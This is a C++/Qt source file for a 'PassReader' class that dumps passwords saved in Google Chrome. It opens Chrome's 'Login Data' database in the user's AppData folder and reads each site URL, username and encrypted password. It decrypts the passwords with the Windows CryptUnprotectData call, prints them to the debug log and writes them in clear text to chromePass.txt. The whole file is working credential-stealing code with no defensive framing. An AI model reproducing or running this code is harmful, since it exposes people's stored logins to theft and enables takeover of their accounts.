#include "passReader.h"

PassReader::PassReader(QObject* parent): QObject(parent)
{
    path = new QString(QDir::currentPath());
}

PassReader::PassReader(QObject* parent, QString &str): QObject(parent)
{
    path = new QString(str);
}

PassReader::~PassReader()
{
    delete path;
}

bool PassReader::readPass()
{
    setlocale(LC_CTYPE, "rus");


    //Output file
    QString filePath = *path + '/' + "chromePass.txt";
    QFile file(filePath);
    file.open(QIODevice::WriteOnly);

    //Open DB
    QSqlDatabase db;
    db = QSqlDatabase::addDatabase("QSQLITE");

    //Get %appdata% folder
    QString appdata = getenv("APPDATA");
    appdata.replace("\\", "/");

    //Destination folder
    db.setDatabaseName(appdata + "/../Local/Google/Chrome/User Data/Default/Login Data");

    if (db.open())
    {
        //Create SQL Query, select url+login+pass
        QSqlQuery query;
        query.exec("SELECT origin_url, username_value, password_value FROM logins");

        while (query.next())
        {
            QString url = query.value(0).toString();
            QString user = query.value(1).toString();
            QByteArray pass = query.value(2).toByteArray();

            //Decrypt
            DATA_BLOB DataIn;
            DATA_BLOB DataOut;
            DATA_BLOB * pDataIn = &DataIn;
            DATA_BLOB * pDataOut = &DataOut;

            DataIn.pbData =  reinterpret_cast<byte *>( pass.data() );  //Pointer to data_input              BYTE*
            DataIn.cbData = pass.size();                               //Size of input string (in bytes)   DWORD

            //Decryption function
            if (CryptUnprotectData(
                    pDataIn,
                    NULL,
                    NULL,               // Entropy
                    NULL,
                    NULL,
                    0,
                    pDataOut))
            {
                QByteArray passDecr;
                unsigned long pass_size  = static_cast<unsigned long>(DataOut.cbData);

                //Get pass string and cut it (pbData doesn't have '\0')
                passDecr.append(reinterpret_cast<char *>(DataOut.pbData));
                passDecr.resize(pass_size);

                qDebug() << endl << url << endl << "user = " << user << "\npass = " << QString(passDecr);

                //Stream for writing
                QTextStream stream(&file);
                stream << endl << url << "\r\nuser = " << user << "\r\npass = " << passDecr << "\r\n\r\n";
            }
            else
            {
                //Error in decryption function
                return false;
            }
        }
    }
    else
        return false;

    file.close();
    emit fileSaved(filePath);
    return true;
}
